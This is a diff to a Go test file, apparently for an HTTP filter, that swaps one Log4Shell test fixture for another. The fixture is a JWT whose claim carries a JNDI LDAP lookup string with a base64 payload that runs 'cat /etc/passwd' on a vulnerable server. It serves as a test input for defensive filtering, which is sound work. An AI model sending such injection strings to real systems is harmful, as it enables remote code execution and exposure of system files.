@@ -10,10 +10,10 @@ import (
 )
 
 var (
-	// malicious JWT token wfor log4shell wth the following claim:
-	// "sub": "${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}"
-	// This contains a payload taht will execute `cat /etc/passwd` on the vulnerable machine
-	malicious = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE2NDI1ODI2MjIsImV4cCI6MTY3NDExODYyMiwiYXVkIjoid3d3LmV4YW1wbGUuY29tIiwic3ViIjoiJHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGw6MTM4OS9leGVjL1kyRjBJQzlsZEdNdmNHRnpjM2RrQ2c9PX0ifQ.ktEyOh8O3QMH6amqZtPsYHjtDeFVXmgKHLt-s0t2ckw"
+	// malicious JWT token for log4shell with the following claim:
+	// "name": "${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}"
+	// This contains a payload that will execute `cat /etc/passwd` on the vulnerable machine
+	malicious = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE4MDA1NjMyNTQsImlhdCI6MTY0Mjc3NTI1NCwiaXNzIjoiZXZpbC5jbyIsIm5hbWUiOiIke2puZGk6bGRhcDovL2xvZzRzaGVsbDoxMzg5L2V4ZWMvWTJGMElDOWxkR012Y0dGemMzZGtDZz09fSIsInN1YiI6Im5hY3gifQ.I59rKl-z5QGKsbT3W9PCDidFrkPrL-iwZFakWy0L0JY"
 )
 
 func TestHttpFilter_OnHttpRequestHeaders(t *testing.T) {
